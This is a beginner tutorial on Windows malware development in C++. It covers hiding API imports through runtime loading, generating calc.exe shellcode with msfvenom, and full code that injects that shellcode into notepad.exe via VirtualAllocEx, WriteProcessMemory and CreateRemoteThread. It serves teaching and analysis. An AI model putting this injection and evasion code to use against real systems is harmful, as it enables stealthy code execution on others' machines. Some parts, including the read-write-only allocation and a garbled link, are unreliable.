# Introduction to MalDev in C++

### Disclaimer

> This article provides some insights about malware development in **education purpose only**. While I wrote this article, I am not professional and may be wrong in some parts, so you are welcome to contact and correct me.

### C++ and Windows API intro

#### MessageBox

Firstly, let's check this `C++` code:

```cpp
#include <winuser.h>

int main(void) {
    MessageBoxA(0, "example box", "0-0", MB_YESNOCANCEL | MB_ICONINFORMATION);
    return 0;
}
```

Essentially, it's just creating message via `MessageBoxA` function from Windows API with some buttons and icons in it.

```powershell
# Compile it and run
g++ .\main.cpp
.\a.exe
```

<figure><img src="../../.gitbook/assets/Pasted image 20240309130643.png" alt=""><figcaption></figcaption></figure>

If you want to play with it and make your window with some tweaks you should look for [windows docs](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa).

> In windows you can also call function `MessageBoxW`, which will take pointer not to the `ASCII` string but to `LPCWSTR`. More about it in this [discussion](https://stackoverflow.com/questions/4592261/windows-api-ansi-and-wide-character-strings-is-it-utf8-or-ascii-utf-16-or-u). And if you call `MessageBoxW`, you should write string in code like this: `L"example box"`.

When someone analyze malware, they always check and make some assumptions about program according to the functions that are imported. Moreover, static analysis is easier if we know what functions are used by malware.

In the next example we load library `user32.dll` in runtime and getting our `MessageBoxA` function which we next call with in the same way as in previous example.

```cpp
#include <windows.h>

typedef int (*MSGBOXWAPI)(IN HWND hWnd, IN LPCSTR lpText, IN LPCSTR lpCaption, IN UINT uType);

int main(void) {
    HMODULE hM = LoadLibraryA("user32.dll");
    MSGBOXWAPI a = (MSGBOXWAPI)GetProcAddress(hM, "MessageBoxA");
    if (a)
        a(0, "example box", "0-0", MB_YESNOCANCEL | MB_ICONINFORMATION);

    return 0;
}
```

If we compare these 2 executable files in `PE-Bear` tool, we will see the difference between them by looking at imports.

<figure><img src="../../.gitbook/assets/Pasted image 20240309153308.png" alt=""><figcaption></figcaption></figure>

#### Shell code

Now let's have some fun with shell code.

> Shellcode is defined as a set of instructions injected and then executed by an exploited program. Shellcode is used to directly manipulate registers and the functionality of a exploited program. We can of course write shell codes in the high level language but would let you know later why they might not work for some cases, so assembly language is preferred for this.
>
> * from exploit-db \[article]\(Shellcode is used to directly manipulate registers and the functionality of a exploited program. We can of course write shell codes in the high level language but would let you know later why they might not work for some cases, so assembly language is preferred for this)

Firstly, let's generate `shellcode` with `msfvenom`:

```shell
$ msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.exe EXITFUNC="thread" > calc_shell
$ xxd calc_shell
00000000: fc48 83e4 f0e8 c000 0000 4151 4150 5251  .H........AQAPRQ
00000010: 5648 31d2 6548 8b52 6048 8b52 1848 8b52  VH1.eH.R`H.R.H.R
00000020: 2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0   H.rPH..JJM1.H1.
00000030: ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed  .<a|., A...A....
00000040: 5241 5148 8b52 208b 423c 4801 d08b 8088  RAQH.R .B<H.....
00000050: 0000 0048 85c0 7467 4801 d050 8b48 1844  ...H..tgH..P.H.D
00000060: 8b40 2049 01d0 e356 48ff c941 8b34 8848  .@ I...VH..A.4.H
00000070: 01d6 4d31 c948 31c0 ac41 c1c9 0d41 01c1  ..M1.H1..A...A..
00000080: 38e0 75f1 4c03 4c24 0845 39d1 75d8 5844  8.u.L.L$.E9.u.XD
00000090: 8b40 2449 01d0 6641 8b0c 4844 8b40 1c49  .@$I..fA..HD.@.I
000000a0: 01d0 418b 0488 4801 d041 5841 585e 595a  ..A...H..AXAX^YZ
000000b0: 4158 4159 415a 4883 ec20 4152 ffe0 5841  AXAYAZH.. AR..XA
000000c0: 595a 488b 12e9 57ff ffff 5d48 ba01 0000  YZH...W...]H....
000000d0: 0000 0000 0048 8d8d 0101 0000 41ba 318b  .....H......A.1.
000000e0: 6f87 ffd5 bbe0 1d2a 0a41 baa6 95bd 9dff  o......*.A......
000000f0: d548 83c4 283c 067c 0a80 fbe0 7505 bb47  .H..(<.|....u..G
00000100: 1372 6f6a 0059 4189 daff d563 616c 632e  .roj.YA....calc.
00000110: 6578 6500                                exe.
```

Also you can play around with `shellcode` and `code cave` along with [this article](https://ap3x.github.io/posts/backdooring-portable-executables-\(pe\)/)

#### Process Injection

Every process have it's own memory and our goal is to the following things:

1. Get a handle
2. Allocate memory
3. Write shellcode
4. Execute shellcode

To do any of these steps in C++ we need to utilize the windows api. Here is the code with comments, read carefully and try to search information about these functions in windows api docs:

```cpp
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

unsigned int shellcode_len = sizeof(shellcode);

/**
 * Returns the PID of the process finded by name
 *
 * @param procname the name of the process
 * @return PID of the process
 */
int getPidByName(const char *procname) {

    // Handle for snpashot of all processes
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    // Take a snapshot of all processes in the system.
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32
    // before calling Process32First we should set the size of the structure
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    // Iterating over each process from snapshot hProcSnap
    // &pe32 -> A pointer to a PROCESSENTRY32 structure.
    while (Process32Next(hProcSnap, &pe32)) {
        // pe32.szExeFile - name of the executable file
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

/**
 * Injects the shellcode into given process
 *
 * @param HANDLE hProc the name of the process
 * @return success of the injection
 */
int inject(HANDLE hProc) {
    PVOID remoteBuffer = NULL;
    HANDLE hThread = NULL;
    DWORD oldprotect = 0;

    // reserve some memory to write (think about it as malloc())
    remoteBuffer = VirtualAllocEx(hProc, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // write data to allocated memory
    printf("virtualAllocEx %d\n", GetLastError());

    // Copies the contents of a source memory block to a destination memory block
    // RtlMoveMemory(remoteBuffer, shellcode, shellcode_len);
    WriteProcessMemory(hProc, remoteBuffer, shellcode, sizeof shellcode, NULL);
    printf("WriteProcessMemory %d\n", GetLastError());

    // here we just run our code in the virtual adress space of given process
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (hThread != NULL) {
        printf("YEAH!\n");
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    CloseHandle(hProc);
    printf("CreateRemoteThread %d\n", GetLastError());
    return -1;
}

int main() {
    int pid = 0;
    HANDLE hProc = NULL;
    char procName[] = "notepad.exe";
    // getting the pid of notepad.exe
    pid = getPidByName(procName);

    if (pid) {

        // Open the target process, if success it will return the handle to the specified process
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

        if (hProc != NULL) {
            printf("Injecting to PID: %i\n", pid);
            inject(hProc);
            printf("lasterr: %d\n", GetLastError());
            CloseHandle(hProc);
        }
    } else {
        printf("process [%s] not found", procName);
    }
    return 0;
}

```

some notes:

* shellcode that I used: `msfvenom -p windows/x64/exec CMD='calc.exe' EXITFUNC=none -f c -v shellcode`
* I ran everything in 64bit mode (maybe I should have told it earlier, nah...)
* compiling:

```
# in linux with the help of mingw-w64 (for ubuntu)
x86_64-w64-mingw32-g++ injection.cpp -o inj ection.exe
# or in powershell, but make sure that you are compiling in 64bit mode (just check if there is PE..L, if so, then you should do something and compile it in 64bit :> )
# if you choose some program that runs in 64bit mode, you should put the shellcode in the same architecture and compile the whole executable in the same way
g++ injection.cpp -o injection.exe
```

* how I list processes and find PID by name: link
